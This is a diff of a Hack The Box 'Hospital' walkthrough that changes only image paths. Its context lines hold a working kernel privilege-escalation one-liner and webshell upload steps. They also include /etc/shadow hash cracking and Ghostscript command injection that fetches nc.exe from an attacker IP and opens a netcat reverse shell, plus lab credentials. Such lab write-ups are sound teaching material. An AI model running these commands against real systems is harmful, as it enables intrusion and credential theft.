@@ -147,25 +147,25 @@ echo "10.10.11.241 hospital.htb" | sudo tee -a /etc/hosts
 
 Visiting hospital.htb:8080 gives and option to create an account, click on __Make one__ http://hospital.htb:8080/login.php
 
-![make an account](img/htb/hospital/make_an_account.png)
+![make an account](.gitbook/assets/img/htb/hospital/make_an_account.png)
 
 Initiating the creation of a new account at http://hospital.htb:8080/register.php, click on Submit after completing the required fields.
 
-![creating account](img/htb/hospital/creating_account.png)
+![creating account](.gitbook/assets/img/htb/hospital/creating_account.png)
 
 Proceeding to http://hospital.htb:8080/login.php, log in using the newly created account.
 
-![login with new account](img/htb/hospital/login_new_account.png)
+![login with new account](.gitbook/assets/img/htb/hospital/login_new_account.png)
 
 After successful login, the website at http://hospital.htb:8080/index.php presents the option to upload files to the server.
 
-![upload button](img/htb/hospital/homepage_upload.png)
+![upload button](.gitbook/assets/img/htb/hospital/homepage_upload.png)
 
 ## File upload exploit 
 
 After capturing and analyzing the request, it becomes apparent that the server has a file upload vulnerability related to the file extension.
 
-![request from upload.php](img/htb/hospital/request_1.png)
+![request from upload.php](.gitbook/assets/img/htb/hospital/request_1.png)
 
 A custom script was made to automate the task of fuzzing extensions on post requests directed at the 'upload.php' of the target machine, using a custom wordlist with the php extensions from [hacktricks file upload page](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology.). The script facilitates the automated upload of a webshell to the server, facilitating the process of identifying valid extensions and exploiting the vulnerability.
 
@@ -211,7 +211,7 @@ if __name__ == "__main__":
 
 The script is used to upload the [p0wny-shell](https://github.com/flozz/p0wny-shell) while finding valid extensions at the same time.
 
-![uploading p0wny](img/htb/hospital/uploading_p0wny.png)
+![uploading p0wny](.gitbook/assets/img/htb/hospital/uploading_p0wny.png)
 
 After successfully uploading the files, the fuzzing process began to find their storage location using ffuf. The point of interest was the 'uploads' folder, where files were found to be stored with identical names as those used during the upload process. Despite the absence of directory listing functionality in /uploads, the files within the 'uploads' directory retained their original filenames, facilitating their retrieval and exploitation.
 
@@ -219,13 +219,13 @@ After successfully uploading the files, the fuzzing process began to find their 
 ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://hospital.htb:8080/FUZZ -o hospital_htb_8080_FUZZ.out -t 15
 ```
 
-![fuzzing uploads](img/htb/hospital/ffuf_uploads.png)
+![fuzzing uploads](.gitbook/assets/img/htb/hospital/ffuf_uploads.png)
 
 ## Shell on Linux Server 
 
 The webshell is discovered at http://hospital.htb:8080/uploads/myfile.phar, where the '.phar' extension was identified as the one capable of executing php code among various other extensions attempted.
 
-![p0wny shell on linux server](img/htb/hospital/p0wny_shell_1.png)
+![p0wny shell on linux server](.gitbook/assets/img/htb/hospital/p0wny_shell_1.png)
 
 Gaining access to the Linux server that hosts http://hospital.htb:8080.
 
@@ -247,7 +247,7 @@ For a stable shell do:
 
 Upon reviewing the 'ifconfig' output, it is determined that the attacker is located within a separate network, as indicated by the 'eth0 inet' IP address.
 
-![ifconfig output](img/htb/hospital/ifconfig_ouptut_1.png)
+![ifconfig output](.gitbook/assets/img/htb/hospital/ifconfig_ouptut_1.png)
 
 ## Privesc on Linux Server 
 Further enumeration shows that the Linux machine is vulnerable to CVE-2023-32629 & CVE-2023-2640 privilege escalation exploits based on the machine kernel which is 5.19.0-35-generic Ubuntu, the exploit works in a path where www-data can read and write.
@@ -256,11 +256,11 @@ poc.sh
 ```bash
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 ```
-![privesc on LS](img/htb/hospital/privesc_linux_server_2.png)
+![privesc on LS](.gitbook/assets/img/htb/hospital/privesc_linux_server_2.png)
 
 Upon achieving root access, the /etc/shadow file is accessible, allowing for the extraction of hashes for cracking attempts.
 
-![reading /etc/shadow](img/htb/hospital/reading_shadow.png)
+![reading /etc/shadow](.gitbook/assets/img/htb/hospital/reading_shadow.png)
 
 Using hashcat, the password for 'drwilliams' is successfully cracked. `qwe123!@#`
 
@@ -271,11 +271,11 @@ hashcat -a 0 -m 1800 drwilliams_hash /usr/share/wordlists/rockyou.txt
 
 The credentials obtained of drwilliams work for the https://hospital.htb webmail.
 
-![drwilliams webmail](img/htb/hospital/drwilliams_webmail_1.png)
+![drwilliams webmail](.gitbook/assets/img/htb/hospital/drwilliams_webmail_1.png)
 
 An email originating from drbrown@hospital.htb instructs drwilliams to send an .eps file intended for visualization with Ghostscript.
 
-![email from drbrown](img/htb/hospital/email_from_drbrown_1.png)
+![email from drbrown](.gitbook/assets/img/htb/hospital/email_from_drbrown_1.png)
 
 A vulnerability in Ghostscript, identified as CVE-2023-36664, enables command injection upon opening a PS or EPS file, potentially resulting in code execution.
 
@@ -287,32 +287,32 @@ The first step is injecting code that will download nc.exe from the attacker ser
 python CVE_023_36664_exploit.py --inject --payload 'curl 10.10.14.26/nc.exe' --filename file.eps
 ```
 
-![running the payload](img/htb/hospital/curl_nc_ghostscript.png)
+![running the payload](.gitbook/assets/img/htb/hospital/curl_nc_ghostscript.png)
 
 Access the compose function, attach the malicious .eps file, set the recipient as Drbrown, and proceed to send the email.
 
-![composing email](img/htb/hospital/composing_email_1.png)
+![composing email](.gitbook/assets/img/htb/hospital/composing_email_1.png)
 
 The attacker's machine receives a GET request, confirming the success of the code injection. Afterwards, nc.exe is now present on the victim machine.
 
-![received "get" hit](img/htb/hospital/get_hit_1.png)
+![received "get" hit](.gitbook/assets/img/htb/hospital/get_hit_1.png)
 
 The attacker proceeds to create and send another malicious .eps file, this time the code injection will tell the victim machine to execute nc.exe and send a reverse shell to the attacker's machine.
 
 ```bash
 python CVE_023_36664_exploit.py --inject --payload 'nc.exe -e cmd 10.10.14.26 9001' --filename file.eps
 ```
-![ghostscript reverse shell injection](img/htb/hospital/ghostscript_reverse_shell.png)
+![ghostscript reverse shell injection](.gitbook/assets/img/htb/hospital/ghostscript_reverse_shell.png)
 
-![composing another email](img/htb/hospital/composing_email_2.png)
+![composing another email](.gitbook/assets/img/htb/hospital/composing_email_2.png)
 
 A reverse shell connection is established, granting the attacker access to the victim machine.
 
-![ps shell received](img/htb/hospital/recv_ps_shell_1.png)
+![ps shell received](.gitbook/assets/img/htb/hospital/recv_ps_shell_1.png)
 
 The user flag is at __C:\Users\drbrown.HOSPITAL\Desktop__
 
-![shell as drbrown](img/htb/hospital/whoami_drbrown_1.png)
+![shell as drbrown](.gitbook/assets/img/htb/hospital/whoami_drbrown_1.png)
 
 ## Root 
  
@@ -323,22 +323,22 @@ Go to C:\xampp\htdocs and upload the [p0wny-shell](https://github.com/flozz/p0wn
 serving the p0wny shell 
 
 
-![serving p0wny](img/htb/hospital/serving_p0wny_1.png)
+![serving p0wny](.gitbook/assets/img/htb/hospital/serving_p0wny_1.png)
 
 downloading the p0wny shell in the htdocs directory
 
 
-![saving p0wny](img/htb/hospital/saving_p0wny_htdocs.png)
+![saving p0wny](.gitbook/assets/img/htb/hospital/saving_p0wny_htdocs.png)
 
 Navigate to https://hospital.htb/pwny.php and a shell as nt authority will be given
 
-![whoami admin](img/htb/hospital/whoami_admin_1.png)
+![whoami admin](.gitbook/assets/img/htb/hospital/whoami_admin_1.png)
 
 ### Solution 2 RDP
 
 There is a password in the ghostscript.bat file. __drbrown:chr!$br0wn__
 
-![drbrown pass](img/htb/hospital/drbrown_pass_1.png)
+![drbrown pass](.gitbook/assets/img/htb/hospital/drbrown_pass_1.png)
 
 Connect to rdp as user drbrown 
 
@@ -348,9 +348,9 @@ xfreerdp /v:10.10.11.241 /u:drbrown /p:'chr!$br0wn'
 
 Here the password can be retrieved in cleartext by just changing the input type from "password" to "text". __Administrator:Th3B3stH0sp1t4l9786!__ 
 
-![admin pass](img/htb/hospital/admin_pass_1.png)
+![admin pass](.gitbook/assets/img/htb/hospital/admin_pass_1.png)
 
 The credentials successfully authenticate with evil-winrm, granting admin access to the victim machine.
 
-![winrm as admin](img/htb/hospital/winrm_as_admin.png)
+![winrm as admin](.gitbook/assets/img/htb/hospital/winrm_as_admin.png)
 
